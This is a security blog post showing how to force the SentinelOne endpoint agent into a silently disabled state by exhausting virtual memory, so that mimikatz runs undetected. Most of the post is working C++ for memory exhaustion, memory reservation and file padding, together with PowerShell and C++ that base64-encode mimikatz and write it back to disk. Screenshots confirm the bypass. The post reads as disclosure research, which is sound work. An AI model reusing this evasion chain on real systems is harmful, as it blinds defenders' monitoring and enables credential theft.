---
title: "Bypassing SentinelOne with resource consumption"
layout: post
tag:
- edr
- evasion
category: blog
---


My coworkers were recently discussing an issue they encountered where SentinelOne agents would automatically disable themselves. When this occurs, the agent reports an operational state of either `auto_partially_disabled` or `auto_fully_disabled` which is described by SentinelOne as `disabled by SentinelOne due to a persistent error .. this usually occurs when an endpoint does not have available resources`. This led me to wonder if a malicious actor could intentionally deplete the available resources on a system to force the agent into a bad state and ultimately bypass controls.

To investigate this idea, I wrote a function which consumes virtual memory by repeatedly allocating chunks of memory, starting at a size of 1GB and decreasing the allocation size by half each time it failed to allocate memory.

```cpp
void consumeVirtualMemory() {
    int allocSize = 1024 * 1024 * 1024;
    while (true) {
        if (VirtualAlloc(NULL, allocSize, MEM_COMMIT, PAGE_READWRITE) == NULL) {
            if (allocSize > 2) {
                allocSize /= 2;
            }
        }
    }
}
```

![Windows-TaskManager](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/Windows-TaskManager.png)

While this approach may seem barbaric, it worked exactly as intended, as seen in the screenshot. It's also worth noting that the term 'committed' doesn't necessarily mean 'in use'. As we can see in Task Manager, only a small amount of memory was in use, with plenty of memory still available. However, this approach still allowed us to achieve our goal of depleting available resources since it prevents other applications from allocating new memory. As a result, I encountered two major issues with this approach:

First, the virtual memory consumption quickly reached the limit, making it impossible to execute anything else due to insufficient free memory.

![Windows-NotEnoughMemory](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/Windows-NotEnoughMemory.png)

Second, the host became increasingly unstable as memory usage was capped, eventually leading to a system crash.

![Windows-BSOD](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/Windows-BSOD.png)

To resolve these issues, I increased the minimum virtual memory threshold to 1MB for greater stability and created a function that reserved a designated region of memory, allowing me to execute my desired executable by releasing it when necessary.

```cpp
bool reserveVirtualMemory(int size, HANDLE& hFileMapping) {
	hFileMapping = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, size, NULL);
	if (hFileMapping == NULL) {
		return false;
	}
	return true;
}
```

Letting this consume resources for some seemingly random time now leads to the SentinelOne agent reporting that it's disabled!

![SentinelOne-Disabled](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/SentinelOne-Disabled.png)

In this case, given a bit of time, the agent is still able to recover itself. Perhaps this is the `auto_partially_disabled` state whereas consuming resources for a longer duration puts it into the `auto_fully_disabled` state that requires manual intervention to re-enable the agent.

Interestingly, using a custom test file I had that isn't ordinarily detected while dormant but gets flagged as suspicious upon execution, I was also able to confirm that the agent is in a disabled state even shortly before it officially reports that it is by successfully executing it without any alerts during this window. I was now determined to write something that would allow me to more reliably execute malicious files without the agent reaching the officially-reported disabled state.

For this, I grabbed something that the agent flags as malicious -- a copy of `mimikatz.exe` -- and converted it into a base64 string stored in a text file using PowerShell.

```posh
# Something like ..
> $Bytes = [IO.File]::ReadAllBytes("C:\mimikatz.exe")
> $B64 = [System.Convert]::ToBase64String($Bytes)
> $B64 | Out-File C:\mimikatz.txt -Encoding ascii -NoNewline
```

I then added some functionality that would allow me to read and decode this base64 encoded string from the text file and write it back out to disk.

```cpp
std::string readFile(const std::string& filePath) {
	std::ifstream fileStream(filePath.c_str());
	std::stringstream fileBuffer;
	fileBuffer << fileStream.rdbuf();
	return fileBuffer.str();
}

// https://stackoverflow.com/a/34571089
std::vector<unsigned char> decodeBase64(const std::string& in) {
	std::vector<unsigned char> out;

	std::vector<int> T(256, -1);
	for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

	int val = 0, valb = -8;
	for (unsigned char c : in) {
		if (T[c] == -1) break;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back(unsigned char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}
	return out;
}

bool writeFile(const std::vector<unsigned char>& fileBytes, const std::string& outFilePath) {
	std::ofstream output_file(outFilePath, std::ios::binary);
	if (!output_file.is_open()) {
		return false;
	}
	output_file.write(reinterpret_cast<const char*>(&fileBytes[0]), fileBytes.size());
	output_file.close();
	if (output_file.fail()) {
		return false;
	}
	return true;
}
```

The `consumeVirtualMemory()` function was then updated to loop for a little while longer before breaking from the loop. This timing seemed to be the sweet spot in placing the agent into a bad state while having it report fully operational.

```cpp
#define MB 1024 * 1024
#define RESERVE_MINIMUM_MB 1

void consumeVirtualMemory() {
	const int minSize = RESERVE_MINIMUM_MB * MB;
	int ensureConsumed = 200;
	int allocSize = 1024 * MB;
	while (true) {
		if (VirtualAlloc(NULL, allocSize, MEM_COMMIT, PAGE_READWRITE) == NULL) {
			if (allocSize > minSize) {
				allocSize /= 2;
			} else {
				ensureConsumed--;
				if (ensureConsumed == 0) {
					break;
				}
				Sleep(50);
			}
		}
	}
}
```

I also added a function which would pad the size of the executable written to be slightly larger than the limit of minimum virtual memory to keep. This felt like it produced the most reliable results with the `reserveVirtualMemory()` function.

```cpp
#define FILE_PADDING_SIZE RESERVE_MINIMUM_MB + 3

void padFileBytes(std::vector<unsigned char>& fileBytes) {
	const int targetSize = FILE_PADDING_SIZE * MB;
	const int paddingSize = targetSize - fileBytes.size();
	if (paddingSize > 0) {
		fileBytes.resize(targetSize);
		std::fill_n(fileBytes.begin() + fileBytes.size() - paddingSize, paddingSize, 0);
	}
}
```

---

Here are the final results:
- A sanity check to confirm that the agent is operational and can detect malicious files, which it did during the write operation.
![S1-Detected](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/S1-Detected.png)

- Testing the code to deplete resources while executing a malicious file resulted in a successful execution, with the agent not throwing any alerts or blocking the execution.
![S1-NotDetected](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/S1-NotDetected.png)

- Giving the agent a little bit of time allows it to fully restore itself. When attempting to execute the file again, the agent successfully mitigated it.
![S1-Detected2](/assets/images/posts/2023-03-15-Bypassing-SentinelOne-with-resource-consumption/S1-Detected2.png)